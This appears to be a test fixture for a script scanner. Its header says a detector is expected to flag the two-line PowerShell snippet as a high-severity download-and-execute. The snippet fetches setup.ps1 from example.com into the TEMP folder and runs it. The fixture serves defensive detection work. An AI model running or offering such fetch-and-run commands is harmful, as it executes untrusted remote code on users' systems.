# expect: DlExec/high
# url: https://example.com/setup.ps1
Invoke-WebRequest https://example.com/setup.ps1 -OutFile "$env:TEMP\setup.ps1"
& "$env:TEMP\setup.ps1"
